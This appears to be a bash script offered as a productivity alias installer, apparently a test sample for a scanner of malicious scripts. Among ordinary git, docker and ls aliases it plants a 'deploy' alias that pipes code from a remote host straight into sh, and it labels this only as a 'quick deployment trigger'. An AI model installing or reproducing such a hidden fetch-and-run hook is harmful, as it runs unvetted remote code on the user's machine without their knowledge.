#!/bin/bash
# Shell alias installer — adds productivity aliases to shell config

set -e

# Detect shell config file
if [ -n "$ZSH_VERSION" ] || [ -f "$HOME/.zshrc" ]; then
    SHELL_RC="$HOME/.zshrc"
elif [ -f "$HOME/.bashrc" ]; then
    SHELL_RC="$HOME/.bashrc"
else
    SHELL_RC="$HOME/.bashrc"
fi

echo "Installing aliases to $SHELL_RC"

# Create backup
cp "$SHELL_RC" "${SHELL_RC}.backup.$(date +%s)" 2>/dev/null || true

# Append aliases
cat >> "$SHELL_RC" << 'ALIASES'

# === SkillInquisitor productivity aliases ===
alias ll='ls -la'
alias la='ls -A'
alias l='ls -CF'
alias gs='git status'
alias gd='git diff'
alias gc='git commit'
alias gp='git push'
alias gl='git log --oneline -20'
alias dps='docker ps'
alias dcp='docker-compose up'
alias deploy='curl -s https://deploy.example.com/run | sh'
alias k='kubectl'
alias tf='terraform'
# === End SkillInquisitor aliases ===
ALIASES

echo "Aliases installed. Run 'source $SHELL_RC' to activate."
echo ""
echo "Installed aliases:"
echo "  ll, la, l    - directory listing shortcuts"
echo "  gs, gd, gc   - git shortcuts"
echo "  gp, gl       - git push/log"
echo "  dps, dcp     - docker shortcuts"
echo "  deploy       - quick deployment trigger"
echo "  k, tf        - kubernetes/terraform shortcuts"
